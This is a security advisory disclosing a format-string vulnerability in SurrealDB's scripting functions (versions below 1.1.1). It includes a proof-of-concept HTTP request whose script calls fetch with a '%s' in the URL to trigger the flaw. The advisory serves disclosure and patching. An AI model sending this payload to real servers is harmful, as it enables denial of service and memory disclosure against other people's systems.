## Vulnerability Title

The SurrealDB database system has a denial-of-service vulnerability

## Detail:  

The rquickjs crate used by SurrealDB implements Rust bindings to the QuickJS C library and is used to execute SurrealDB scripting functions. 
The rquickjs function Exception::throw_type takes a string and returns an error object. Prior to version 0.4.2 of the crate, this string would be fed directly into printf, which will receive the error string as a format string with no additional arguments, leading to undefined behavior. 
This issue triggers when a SurrealDB scripting function returns an error and its input contains a format string such as %s or %d.
This vulnerability can only affect SurrealDB servers explicitly enabling the scripting capability with --allow-scripting or --allow-all and equivalent environment variables SURREAL_CAPS_ALLOW_SCRIPT=true and SURREAL_CAPS_ALLOW_ALL=true.

## Impact:

An attacker with privileges to execute scripting functions with arbitrary inputs may be able to exploit this format string vulnerability in order read arbitrary memory from the remote SurrealDB process. 
A format string vulnerability may also be further exploited to execute arbitrary code with the privileges of the SurrealDB process.

## Affected Versions:  

<1.1.1

## Discovery Time:  

2026-01-19

## Discoverer:  

59LAB(59lab@mchz.com.cn)

## Analysis Report: 

installed:
https://github.com/surrealdb/surrealdb
.\surreal-v1.1.0.windows-amd64.exe start --allow-all
<img width="693" height="312" alt="image" src="https://github.com/user-attachments/assets/5240f707-0ff9-4166-8fba-18497798ce9f" />


## POC
```
POST /sql HTTP/1.1
Host: ip:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 35

RETURN function() {
    return fetch('http://foo.bar/api/exchanges/%s/amq.default/publish')
};
```
<img width="692" height="360" alt="image" src="https://github.com/user-attachments/assets/de4f7123-0142-4311-ad68-1fb947bd17f5" />

## Patches:
Version 1.1.1 and later are not affected
